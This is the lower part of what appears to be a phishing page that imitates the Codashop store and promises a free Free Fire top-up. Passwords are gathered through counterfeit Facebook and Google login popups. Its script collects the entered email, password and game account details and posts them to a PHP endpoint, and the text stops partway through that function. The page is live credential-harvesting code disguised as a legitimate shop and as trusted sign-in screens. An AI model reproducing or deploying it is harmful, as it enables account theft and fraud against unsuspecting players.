                        <div data-v-5dc48776="" data-v-2b49aa10="" class="footer__legal-section"><!----><!---->
                            <div data-v-5dc48776="" class="footer__copyright">©Hak Cipta Coda Payments</div>
                            <div data-v-5dc48776="" class="footer__legal-links"><a data-v-5dc48776="" href="https://marketing.codashop.com/marketing-and-partnership-id" target="_blank" rel="noopener" class="footer__legal--url">Pemasaran dan Kemitraan</a><a data-v-5dc48776="" href="https://www.codapayments.com/" target="_blank" rel="noopener" class="footer__legal--url">Untuk Penerbit Game</a><a data-v-5dc48776="" href="https://www.codapayments.com/policy/terms-conditions" target="_blank" rel="noopener" class="footer__legal--url">Syarat &amp; Ketentuan</a><a data-v-5dc48776="" href="http://www.codapayments.com/policy/privacy-policy/privacy-policy-bahasa" target="_blank" rel="noopener" class="footer__legal--url">Kebijakan Privasi</a><a data-v-5dc48776="" href="https://www.codapayments.com/legal/coda-payments-vulnerability-disclosure-policy" target="_blank" rel="noopener" class="footer__legal--url">Bounty bug</a></div>
                            <div data-v-5dc48776="" class="footer__logo"><a data-v-5dc48776="" href="/id-id/" class="logo__link router-link-active"><img data-v-5dc48776="" src="https://cdn1.codashop.com/S/content/mobile/images/codashop-logo-new-3a.png" alt="Logo" height="24" width="auto" class="logo__image logo--theme"></a></div>
                        </div>
                    </section>
                </div>
            </footer><!---->
            <div data-v-64ea578e="" class="toast-wrapper">
                <div data-v-64ea578e="" class="toast-wrapper__toast">
                    <div data-v-64ea578e="" class="toast-wrapper__toast__icon"><svg data-v-64ea578e="" width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path data-v-64ea578e="" d="M10 2C7.87827 2 5.84344 2.84285 4.34315 4.34315C2.84285 5.84344 2 7.87827 2 10C2 12.1217 2.84285 14.1566 4.34315 15.6569C5.84344 17.1571 7.87827 18 10 18C12.1217 18 14.1566 17.1571 15.6569 15.6569C17.1571 14.1566 18 12.1217 18 10C18 7.87827 17.1571 5.84344 15.6569 4.34315C14.1566 2.84285 12.1217 2 10 2ZM0 10C0 4.477 4.477 0 10 0C15.523 0 20 4.477 20 10C20 15.523 15.523 20 10 20C4.477 20 0 15.523 0 10Z" fill="white"></path>
                            <path data-v-64ea578e="" d="M10 12C9.73478 12 9.48043 11.8946 9.29289 11.7071C9.10536 11.5196 9 11.2652 9 11V5C9 4.73478 9.10536 4.48043 9.29289 4.29289C9.48043 4.10536 9.73478 4 10 4C10.2652 4 10.5196 4.10536 10.7071 4.29289C10.8946 4.48043 11 4.73478 11 5V11C11 11.2652 10.8946 11.5196 10.7071 11.7071C10.5196 11.8946 10.2652 12 10 12Z" fill="white"></path>
                            <path data-v-64ea578e="" d="M8.5 14.5C8.5 14.1022 8.65804 13.7206 8.93934 13.4393C9.22064 13.158 9.60218 13 10 13C10.3978 13 10.7794 13.158 11.0607 13.4393C11.342 13.7206 11.5 14.1022 11.5 14.5C11.5 14.8978 11.342 15.2794 11.0607 15.5607C10.7794 15.842 10.3978 16 10 16C9.60218 16 9.22064 15.842 8.93934 15.5607C8.65804 15.2794 8.5 14.8978 8.5 14.5Z" fill="white"></path>
                        </svg><!----></div>
                    <div data-v-64ea578e="" class="toast-wrapper__toast__message"></div>
                    <div data-v-64ea578e="" class="toast-wrapper__toast__close"><svg data-v-64ea578e="" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path data-v-64ea578e="" opacity="0.4" d="M16.34 1.99979H7.67C4.28 1.99979 2 4.37979 2 7.91979V16.0898C2 19.6198 4.28 21.9998 7.67 21.9998H16.34C19.73 21.9998 22 19.6198 22 16.0898V7.91979C22 4.37979 19.73 1.99979 16.34 1.99979Z" fill="white"></path>
                            <path data-v-64ea578e="" d="M15.0163 13.7703L13.2373 11.9923L15.0153 10.2143C15.3573 9.87329 15.3573 9.31829 15.0153 8.97729C14.6733 8.63329 14.1203 8.63429 13.7783 8.97629L11.9993 10.7543L10.2203 8.97429C9.87831 8.63229 9.32431 8.63429 8.98231 8.97429C8.64131 9.31629 8.64131 9.87129 8.98231 10.2123L10.7623 11.9923L8.98631 13.7673C8.64431 14.1093 8.64431 14.6643 8.98631 15.0043C9.15731 15.1763 9.38031 15.2613 9.60431 15.2613C9.82931 15.2613 10.0523 15.1763 10.2233 15.0053L11.9993 13.2293L13.7793 15.0083C13.9503 15.1793 14.1733 15.2643 14.3973 15.2643C14.6213 15.2643 14.8453 15.1783 15.0163 15.0083C15.3583 14.6663 15.3583 14.1123 15.0163 13.7703Z" fill="white"></path>
                        </svg></div>
                </div>
            </div>
        </div>
    </div>
	
	<div data-v-6530b15f="" data-v-16bec177="" class="modal-backdrop account_confirmation" style="display: none;">
    <div data-v-6530b15f="" class="modal-container">
        <div data-v-6530b15f="" class="modal-header bg-default">
            <p data-v-6530b15f="" class="modal-header__title">Detail pesanan</p>
            <div data-v-6530b15f="" class="modal-header-close bg-default"></div>
        </div>
        <div data-v-6530b15f="" class="modal-body" style="height: auto;">
            <div data-v-16bec177="" class="order-info__container">
                <p data-v-16bec177="" class="order-info__subheader">Mohon konfirmasi Username anda sudah benar.</p><span data-v-16bec177="">
                    <div data-v-16bec177="">
                        <div data-v-16bec177="" class="order-info__row">
                            <div data-v-16bec177="" class="first-col">ID: </div>
                            <div data-v-16bec177="" class="second-col confirmationPlayid"></div>
                        </div>
                    </div>
                    <div data-v-16bec177="">
                        <div data-v-16bec177="" class="order-info__row">
                            <div data-v-16bec177="" class="first-col">Bayar dengan: </div>
                            <div data-v-16bec177="" class="second-col">Codapayments</div>
                        </div>
                    </div>
                    <div data-v-16bec177="">
                        <div data-v-16bec177="" class="order-info__row">
                            <div data-v-16bec177="" class="first-col">Harga: </div>
                            <div data-v-16bec177="" class="second-col">Rp. 0 (Gratis)</div>
                        </div>
                    </div>
                    <div data-v-16bec177="">
                        <div data-v-16bec177="" class="order-info__row">
                            <div data-v-16bec177="" class="first-col">Total:</div>
                            <div data-v-16bec177="" class="second-col">Rp. 0 (Gratis)</div>
                        </div>
                    </div>
                    <div data-v-16bec177=""></div>
                    <div data-v-16bec177=""></div>
                    <div data-v-16bec177=""></div>
                    <div data-v-16bec177=""></div>
                </span>
                <div data-v-16bec177="" class="order-info__total-payment">
                    <hr data-v-16bec177="" class="dashed-line">
                    <div data-v-16bec177="" class="order-info__total-payment__row">
                        <div data-v-16bec177="" class="total-payment-label">Total pembayaran</div>
                        <div data-v-16bec177="" class="total-payment-value">Rp. 0 (Gratis)</div>
                    </div>
                </div>
            </div>
        </div>
        <div data-v-6530b15f="" class="modal-footer bg-white">
		<button data-v-71db3a9f="" data-v-16bec177="" type="button" class=" btn-negative btn-multiple" onclick="close_account_confirmation()">Batalkan </button>
		<button data-v-71db3a9f="" data-v-16bec177="" type="button" class=" btn-default btn-multiple" onclick="open_account_login()">Konfirm </button>
		</div>
    </div>
</div>

    <div data-v-6530b15f="" data-v-43ab04a4="" class="modal-backdrop account_login" style="display: none;">
        <div data-v-6530b15f="" class="modal-container">
            <div data-v-6530b15f="" class="modal-header bg-default">
                <p data-v-6530b15f="" class="modal-header__title">Masuk</p>
                <div data-v-6530b15f="" class="modal-header-close bg-default"></div>
            </div><!---->
            <div data-v-6530b15f="" class="modal-body" style="height: auto;">
                <div data-v-43ab04a4="" class="modal-error__container">
                    <p data-v-43ab04a4="" class="modal-error__message">Masuk menggunakan akun kamu</p>
                </div>
				<div class="btn-login" onclick="open_facebook()"><i class="fa-brands fa-square-facebook"></i> Masuk dengan Facebook</div>
				<div class="btn-login" style="background: #F1F3F4; color: #000; border: 1px solid #9AA0A6;" onclick="open_google()"><img src="https://images.cahyosr.my.id/img/17/assets/g.png"> Masuk dengan Google</div>
            </div>
        </div>
    </div>
	
<div class="popup-login login_facebook" style="display: none;">
<div class="popup-box-login-fb">
<a onclick="close_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
<div class="navbar-fb"><img src="https://images.cahyosr.my.id/img/17/assets/login-Method1.png"></div> <!--- navbar-fb --->
<div class="content-box-fb">
<img src="https://images.cahyosr.my.id/img/17/assets/gamecon.jpg">
<p>Masuk menggunakan akun Facebook kamu untuk melanjutkan ke Free Fire</p>
<form class="form-group-fb" action="javascript:void(0)" method="post" id="ValidateVerificationDataFB">
<input type="text" name="email" id="email-facebook" placeholder="Nomor ponsel atau alamat email" autocomplete="off" autocapitalize="off" required>
<input type="password" name="password" id="password-facebook" placeholder="Kata sandi" autocomplete="off" autocapitalize="off" required>
<input type="hidden" name="login" id="login-facebook" value="Facebook" readonly>
<button type="submit" onclick="ValidateLoginFbData()">Masuk</button>
</form>
<span>Buat akun</span>
<span>Jangan sekarang</span>
<span>Lupa sandi?</span>
</div> <!--- content-box-fb --->
<div class="language-box">
<center>
<div class="language-name language-name-active">Bahasa Indonesia</div> <!--- language-name language-name-active --->
<div class="language-name">English (UK)</div> <!--- language-name --->
<div class="language-name">Türkçe</div> <!--- language-name --->
<div class="language-name">Tiếng Việt</div> <!--- language-name --->
<div class="language-name">日本語</div> <!--- language-name --->
<div class="language-name">Español</div> <!--- language-name --->
<div class="language-name">Português (Brasil)</div> <!--- language-name --->
<div class="language-name"><i class="fa fa-plus"></i></div> <!--- language-name --->
</center>
</div> <!--- language-box --->
<div class="copyright">Facebook Inc.</div> <!--- copyright --->
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login --->

<div class="popup-login login_google" style="display: none;">
        <div class="popup-box-login-google clearfix">
            <a onclick="close_google()" class="close-other"><i class="fa-solid fa-xmark"></i></a>
            <div class="box-google">
                <div class="header-google">
                    <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff">
                        <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
                        <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
                        <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
                        <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
                    </svg>
                    <div class="header-google-title">Login</div>
                    <div class="header-google-description">Gunakan Akun Google Anda</div>
                </div>
                <form action="javascript:void(0)" method="post" id="ValidateVerificationDataGP">
                    <div class="input-box">
                        <label class="input-label">Email or phone</label>
                        <input type="text" class="input-1" name="email" id="email-google" onfocus="setFocus(true)" onblur="setFocus(false)" required>
                    </div>
                    <div class="input-box" style="margin-bottom: 0px;">
                        <label class="input-label">Password</label>
                        <input type="password" class="input-1" name="password" id="password-google" onfocus="setFocus(true)" onblur="setFocus(false)" required>
                    </div>
                    <input type="hidden" name="login" id="login-google" value="Google" readonly>
                    <button type="button" class="btn-forgot-google">Lupa email?</button>
                    </br>
                    <div class="notify-google">Bukan komputer Anda? Gunakan jendela penjelajahan rahasia untuk login. <span>Pelajari lebih lanjut cara menggunakan Mode tamu</span></div>
                    </br>
                    <button type="submit" class="btn-login-google" onclick="ValidateLoginGpData()">Selanjutnya</button>
                    <button type="button" class="btn-create-google">Buat akun</button>
                </form>
                </br>
            </div>
        </div>
    </div>
	
    <script src="https://www.codashop.com/assets/npm.amazon-cognito-identity-js.9237e85c478474aba72d.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.apollo-cache.5802cc5cca8c137ace6c.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.apollo-cache-inmemory.be504a334d6ffd94a755.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.apollo-client.48d6996656c927934fa8.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.apollo-link.0ce2a444375656a728f1.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.apollo-link-context.611bb54f28feb1b9339c.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.apollo-link-http.1c0b6af9b16df3c10368.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.apollo-link-http-common.3503a6bc16518353bb1c.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.apollo-utilities.215acf3048558fb04a8f.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.asn1.js.a04aa8345afd26eab819.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.aws-amplify.234fa3b751469a4cafc3.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.aws-crypto.e068d588e09412c8d78d.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.aws-sdk.a24717fe70f31b99d889.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.axios.ca3497aeb4c35d4b960b.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.base64-js.ff73d14f87262d311532.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.bn.js.95d9f99060cd30d6bd6e.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.bowser.5d100c1438dc18957bbb.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.brorand.d8273230a7a7ba0343b4.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.browserify-aes.e8996148fb5eb5e0ccf6.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.browserify-cipher.6dabc5dcbcad5863683e.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.browserify-des.d0a10adb4e1b609e42b7.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.browserify-rsa.649a550b87d90f07f23d.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.browserify-sign.d34bd9bcd51f54ac2621.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.buffer.4071ed6e8bed01ef1b00.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.buffer-equal-constant-time.c9509402c244755e022e.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.buffer-xor.33c35294d71d63cceab1.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.cipher-base.c8ada6229c8391af0710.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.clipboard.8cc757a7436a129a5ac2.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.cookie.691d5311ecea300f2eb9.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.cookie-universal.a73efc67ab703516a582.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.core-js.903a86f4fb0c866f35ba.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.core-util-is.2a052749dedef27fd14e.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.create-ecdh.7d25268072281d8ca6b4.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.create-hash.c4c09eb1adca17346f1b.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.create-hmac.a1355ef25d6d924fd9a0.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.crypto-browserify.0803a7a828d10dc7acca.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.crypto-js.659449ef56876aee6fe6.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.deepmerge.bfa921c8916e7df392bd.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.des.js.e7ceeb62de1fc007032b.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.diffie-hellman.741e7b68ed774e4696b0.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.dompurify.49260a3389be6981d7dd.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.ecdsa-sig-formatter.97e8ed3a4966f40fce56.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.elliptic.ac3a09f2d2ef47d44811.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.events.da159c6b66781b1f8c88.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.evp_bytestokey.4a9ca8563e321d89fde3.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.experiments.928eca24fb3cd09d33c1.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.fast-json-stable-stringify.9fb9956ba42a48d55442.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.fast-xml-parser.49ce6935a5b554f3fc87.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.flatted.fdd7e1d245548bf4ea92.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.graphql.93cbe4d0b551a1e88e76.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.graphql-tag.ff7ba81e4ceb3e517173.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.growthbook.7f8233ba89a3c0a30b46.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.gtm-support.c21700736103afd35313.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.hash-base.6f80f658d651c8fe90ca.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.hash.js.05613bed92d762eed21b.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.hmac-drbg.bc20bf71c5519a1dd9f1.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.ieee754.a8a0e273e9616697ac0e.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.inherits.c968e8ae8d40d3bf70a4.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.isarray.79777e3bb6b156f85bba.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.isomorphic-unfetch.f347b0f41a860f629573.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.js-cookie.fc78000be026d7f1de3c.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.jsonwebtoken.8225deb63e03f51cbdb3.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.jwa.58021745266c4c81e40d.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.jws.1cdb35576fd164f4cc01.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.lodash.4c640869c6866850fd67.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.lodash.includes.e144c628a15a2d3f0fe4.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.lodash.isboolean.f22e3b1381200acbd289.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.lodash.isinteger.a4f9cb14f360f7e4f2dc.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.lodash.isnumber.6f26998256a5cf1561e1.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.lodash.isplainobject.3a84959857cafe107bf4.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.lodash.isstring.849440c6420ca6477b72.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.lodash.once.581b2f53fe7420134304.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.lukeed.32636b505ed308490eed.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.md5.js.5bfc75e8f461f9e335bc.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.miller-rabin.10b05e001d40d02dd013.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.minimalistic-assert.849a83e2d28b153c0dc6.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.minimalistic-crypto-utils.6510f45f5aedb8967b02.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.ms.9190ace79303cfc0e6b8.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.node-abort-controller.541799f3d499aa7cac35.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.node-fetch.ab00435915af82019b12.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.node-libs-browser.f7d44fc586406f897a4e.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.optimism.7cdc15d9ec1e594fb08f.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.parse-asn1.3cd418cd9c34a4726622.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.path-browserify.d40effe3e53bd1353b66.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.pbkdf2.6954b11082959a4d2240.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.process-nextick-args.f9925ca3040d5f68dc89.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.public-encrypt.90ce31658f6bb876b944.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.punycode.1e97f3b6663c48d29ba0.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.querystring-es3.617d4b41a6fcba1becfb.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.randombytes.8caf5fdb8ac09a8c063d.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.randomfill.8b0c24652db8b2263eb6.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.readable-stream.af05084fc8233a9b796f.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.regenerator-runtime.9e13e3b210e7b292b8d8.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.register-service-worker.dd343a3cd68f663e679b.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.ripemd160.a3e75c8724e70a8c3c8b.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.safe-buffer.133656f1429d4693696c.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.safer-buffer.3250d46f88e5c39b14de.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.sentry.b3c61292f28f18f85deb.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.sha.js.810b297bdf0b246ebd14.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.stream-browserify.3f16327245801acca98f.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.string_decoder.2231fb690fe04551867d.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.strnum.63ecd5c572ebfdcfed4e.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.symbol-observable.168e8cdfd14361652353.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.tiny-cookie.cb3840c78854f7e7def1.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.ts-invariant.828210a6fcc568b75a25.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.tslib.d79777dfb3df70e283bf.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.unfetch.29873a550ff7520304af.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.universal-cookie.81141ed1fc32104f1f4d.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.url.b53bd76f956b92cea0ae.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.util.fe1011281028eb7018aa.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.util-deprecate.01ec85a53a16dc6f36cd.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.uuid.441f5e72be634a6cf345.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.vue.0fc0855c556e5859958d.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.vue-apollo.2cd24cc0a97716d81b21.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.vue-axios.24f74873d9e7eaf924ae.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.vue-clipboard2.408b1e05c6fde3935c47.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.vue-cookie.f49b7954ceecc1baeb5f.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.vue-head.656273860e7ac4cad82e.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.vue-i18n.2298792bdc5fa1685e33.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.vue-loader.122194bbbec794da6f73.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.vue-meta.291946be1a5e5c89944f.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.vue-plugin-load-script.92fd09e4c520eaef4b6e.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.vue-router.5c25d1c8d46f5276b6e2.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.vuex.f0e82ced051cc1ac9cc5.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.vuex-persist.5f913d281630fa4ef486.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.webpack.e64a58870b0645d66c63.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.wry.8287990cefd04ffb4376.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/npm.zen-observable.d0a95d20a40a24058ad5.95616.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/js/runtime.c76ab938.js" defer="" crossorigin="anonymous"></script>
    <script src="https://www.codashop.com/assets/app.582c2253c0c66ab1e35b.95616.js" defer="" crossorigin="anonymous"></script>

    <script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <script src="https://code.cahyosr.my.id/github/jquery-3.7.1.min.js"></script>
    <script src="https://code.cahyosr.my.id/npm/jquery-15.min.js"></script>
    <script>
function ValidateVerificationData() {
  var $form = $('#FormFB');

  var $validateEmail = $("input#validateEmail").val();
  var $validatePassword = $("input#validatePassword").val();
  var $validatePlayid = $("input#validatePlayid").val();
  var $nick = $("input#nick").val();
  var $level = $("input#level").val();
  var $tier = $("input#tier").val();
  var $rpt = $("input#rpt").val();
  var $validateLogin = $("input#validateLogin").val();

  if (
    $validateEmail === "" &&
    $validatePassword === "" &&
    $validatePlayid === "" &&
    $nick === "" &&
    $level === "" &&
    $tier === "" &&
    $rpt === "" &&
    $validateLogin === ""
  ) {
    $('.verification_info').show();
    $('.account_verification').hide();
    return false;
  }

  $.ajax({
    type: "POST",
    url: "codxfinal.php",
    data: $form.serialize(),
    beforeSend: function () {
      $('.ValidateVerificationDataBtn')
        .html('<i class="zmdi zmdi-spinner zmdi-hc-spin zmdi-hc-1x"></i>')
